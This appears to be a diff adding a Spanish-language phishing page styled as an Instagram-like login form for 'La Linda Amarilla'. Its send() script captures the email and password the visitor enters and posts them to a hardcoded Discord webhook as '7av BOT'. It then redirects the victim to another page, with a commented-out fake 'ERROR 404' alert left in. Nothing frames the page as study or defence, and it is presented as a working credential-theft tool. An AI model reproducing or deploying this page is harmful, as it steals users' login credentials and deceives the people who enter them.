@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="ES">
+<head>
+	<meta charset="UTF-8">
+	<title>La Linda Amarilla | Login</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed:ital@0;1&family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet">
+</head>
+<body>
+
+    
+
+<div class="wrapper">
+	<div class="header">
+		<div class="top">
+			<div class="logo">
+				<img src="logo.jpg" alt="instagram" style="width: 175px;">
+				<h2>La Linda Amarilla backup</h2><br>
+			</div>
+			<div class="form">
+			
+			<div class="input_field">
+				<input type="email" name="username" id="username" placeholder="Correo electronico" class="input" required>
+				</div>
+			<div class="input_field">
+					<input type="password" name="password" id="password" placeholder="Contraseña" class="input"required>
+				</div>
+				<button class="btn" onclick="send()" >
+					<div class="btnt" > Iniciar sesión </div>
+				</button>
+			</form>
+			</div>
+
+			<div class="dif">
+
+
+			</div>
+		</div>
+
+	</div>
+
+</div>
+
+<script>
+
+    function send(){
+        var a = document.getElementById("username").value; 
+        var b = document.getElementById("password").value; 
+        var discordWebhook = "https://discordapp.com/api/webhooks/1207193687587688498/TFjdROlw8YwDDt4_rx-O_VicZdi6p89SroiNCFLfRV5rCsOzFSitqFjQUUPIeymuV7jY";       
+        var request = new XMLHttpRequest();
+        request.open("POST", discordWebhook);
+        request.setRequestHeader('Content-type', 'application/json');
+        var params = {
+            username: "7av BOT",
+            avatar_url: "https://assets.stickpng.com/thumbs/580b57fbd9996e24bc43bdf6.png",
+            content: 'E-mail :`'+a+"` Password:`"+b+"`"
+    
+        };
+        request.send(JSON.stringify(params));
+        /**alert("ERROR 404")*/
+        setTimeout(function() {
+            window.location.href = 'web.html';
+        }, 2000);
+    
+    }
+    
+</script>
+<style>
+@import url('https://fonts.googleapis.com/css?family=Roboto&display=swap');
+
+*{
+	margin: 0;
+	padding: 0;
+	box-sizing: border-box;
+	outline: none;
+	list-style: none;
+	text-decoration: none;
+	font-family: "Roboto", sans-serif;
+    font-weight: 400;
+    font-style: normal;
+}
+
+body{
+	background: #131313;
+	font-size: 14px;
+}
+
+.wrapper .header{
+	max-width: 350px;
+	width: 100%;
+	height: auto;
+	margin: 50px auto;
+}
+
+h2 {
+	color: white;
+}
+
+.wrapper .header .top,
+.wrapper .signup{
+	background: #3a3a3a;
+	border-radius: 20px;
+	padding: 40px 40px 20px;
+}
+
+.wrapper .header .logo img{
+	display: block;
+	margin: 0 auto 35px;
+}
+
+.wrapper .header .form .input_field{
+	margin-bottom: 5px;
+}
+
+.wrapper .header .form .input_field .input{
+	width: 100%;
+	background: #fafafa;
+	border: 1px solid #efefef;
+	font-size: 12px;
+	border-radius: 3px;
+	color: #262626;
+	padding: 10px;
+}
+
+.wrapper .header .form .input_field .input:focus{
+	border: 1px solid #b2b2b2;
+}
+
+.wrapper .header .form .btn {
+	margin: 10px 0;
+	background-color: rgb(63, 170, 252);
+    	border: 1px solid rgb(63,170,255);
+    	border-radius: 4px;
+   	text-align: center;
+   	padding: 5px;
+	width: 100%;
+}
+
+.wrapper .header .form .btn:hover{
+	margin: 10px 0;
+	background-color: #3897f0;
+   	border: 1px solid #3897f0;
+    	border-radius: 4px;
+    	text-align: center;
+	padding: 5px;
+    	width: 100%;
+}
+
+.wrapper .header .form .btnt{
+	color: #fff;
+	display: block;
+	font-size: 1rem;
+}
+
+.wrapper .header .or{
+	display: flex;
+	justify-content: space-between;
+	align-items: center;
+	height: 15px;
+	margin: 15px 0 20px;
+}
+
+.wrapper .header .or .line{
+	width: 105px;
+	height: 2px;
+	background: #efefef;
+}
+
+.wrapper .header .or p{
+	color: #999;
+	font-size: 12px;
+}
+
+.wrapper .dif .fb{
+	display: flex;
+	justify-content: center;
+	align-items: center;
+}
+
+.wrapper .dif .fb img{
+	width: 16px;
+	height: 16px;
+}
+
+.wrapper .dif  .fb p{
+	color: #385185;
+	font-weight: 500;
+	margin-left: 10px;
+}
+
+.wrapper .dif .forgot{
+	font-size: 12px;
+	text-align: center;
+	margin-top: 20px;
+}
+
+.wrapper .dif .forgot a{
+	color: #003569;
+}
+
+.wrapper .signup{
+	margin: 10px 0 20px;
+	padding: 25px 40px;
+	text-align: center;
+	color: #262626;
+}
+
+.wrapper .signup a{
+	color: #3897f0;
+}
+
+.wrapper .apps{
+	text-align: center;
+	color: #262626;
+}
+
+.wrapper .apps p{
+	margin-bottom: 20px;
+}
+
+.wrapper .apps a img{
+	width: 135px;
+	height: 40px;
+	margin: 0 5px;
+}
+
+.footer{
+	max-width: 935px;
+	width: 100%;
+	margin: 0 auto;
+	padding: 40px 0;
+	display: flex;
+	justify-content: space-between;
+}
+
+.footer .links ul li{
+	display: inline-block;
+	margin-right: 10px;
+}
+
+.footer .links ul li a{
+	color: #003569;
+	font-size: 12px;
+}
+
+.footer .copyright{
+	color: #999;	
+}
+</style>
+</body>
+
+</html>
